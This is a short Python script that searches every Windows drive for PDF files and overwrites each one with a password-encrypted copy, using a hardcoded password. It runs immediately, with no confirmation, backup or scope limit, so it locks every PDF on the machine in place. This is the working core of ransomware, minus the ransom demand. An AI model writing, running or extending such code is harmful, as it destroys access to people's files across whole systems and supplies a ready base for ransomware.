import os
from PyPDF2 import PdfReader, PdfWriter
import string


# Define the encryption password
password = "12345"

# Function to encrypt a single PDF file
def encrypt_pdf(filepath, password):
    try:
        pdf_reader = PdfReader(filepath)
        pdf_writer = PdfWriter()

        # Copy all pages to the writer and encrypt them
        for page_num in range(len(pdf_reader.pages)):
            pdf_writer.add_page(pdf_reader.pages[page_num])

        pdf_writer.encrypt(password)

        # Overwrite the original file
        with open(filepath, "wb") as f:
            pdf_writer.write(f)

        print(f"Encrypted {filepath}")
    except Exception as e:
        print(f"Failed to encrypt {filepath}: {e}")

# Function to search and encrypt all PDFs in the system
def encrypt_all_pdfs(root_dir, password):
    for dirpath, _, filenames in os.walk(root_dir):
        for filename in filenames:
            if filename.endswith(".pdf"):
                filepath = os.path.join(dirpath, filename)
                encrypt_pdf(filepath, password)

# Function to get all available drives and start encryption on each
def encrypt_all_drives(password):
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    for drive in drives:
        print(f"Encrypting PDFs in {drive}")
        encrypt_all_pdfs(drive, password)

# Start the encryption process for all drives
encrypt_all_drives(password)
